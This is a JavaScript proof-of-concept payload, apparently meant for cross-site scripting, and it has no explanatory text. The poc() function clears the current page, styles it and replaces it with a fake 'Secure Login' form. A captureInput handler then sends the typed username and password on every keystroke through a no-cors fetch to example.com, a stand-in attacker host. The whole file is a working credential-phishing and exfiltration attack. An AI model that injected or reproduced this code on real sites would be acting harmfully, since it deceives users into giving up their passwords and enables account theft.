function poc() {
    document.body.innerHTML=""
    const style = document.createElement("style");
    style.textContent = `
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7fc;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background: #ffffff;
            padding: 30px 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-header h2 {
            color: #333;
            font-size: 24px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            font-size: 14px;
            color: #555;
            font-weight: 500;
            margin-bottom: 8px;
            display: block;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            border-color: #5b9bd5;
            outline: none;
        }

        .form-group button {
            width: 100%;
            padding: 12px;
            background-color: #5b9bd5;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .form-group button:hover {
            background-color: #4a86d2;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #aaa;
        }

        .footer a {
            text-decoration: none;
            color: #5b9bd5;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    `;
    document.head.appendChild(style);

    const container = document.createElement("div");
    container.className = "login-container";

    const header = document.createElement("div");
    header.className = "login-header";
    header.innerHTML = "<h2>Secure Login</h2>";
    container.appendChild(header);

    const form = document.createElement("form");
    form.autocomplete = "on";

    const createInput = (labelText, type, id) => {
        const group = document.createElement("div");
        group.className = "form-group";

        const label = document.createElement("label");
        label.setAttribute("for", id);
        label.textContent = labelText;

        const input = document.createElement("input");
        input.type = type;
        input.id = id;
        input.name = id;
        input.placeholder = `Enter your ${labelText.toLowerCase()}`;
        input.autocomplete = type === "password" ? "current-password" : "username";

        input.addEventListener("input", captureInput);

        group.appendChild(label);
        group.appendChild(input);
        return group;
    };

    form.appendChild(createInput("Username", "text", "username"));
    form.appendChild(createInput("Password", "password", "password"));

    const buttonGroup = document.createElement("div");
    buttonGroup.className = "form-group";
    const btn = document.createElement("button");
    btn.type = "submit";
    btn.textContent = "Login";
    buttonGroup.appendChild(btn);
    form.appendChild(buttonGroup);

    container.appendChild(form);

    const footer = document.createElement("div");
    footer.className = "footer";
    footer.innerHTML = `<p>Forgot your <a href="#">username</a> or <a href="#">password?</a></p>`;
    container.appendChild(footer);

    document.body.appendChild(container);
};

function captureInput() {
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const exfilUrl = `//example.com/?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
    fetch(exfilUrl, { method: 'GET', mode: 'no-cors' });
}
poc()
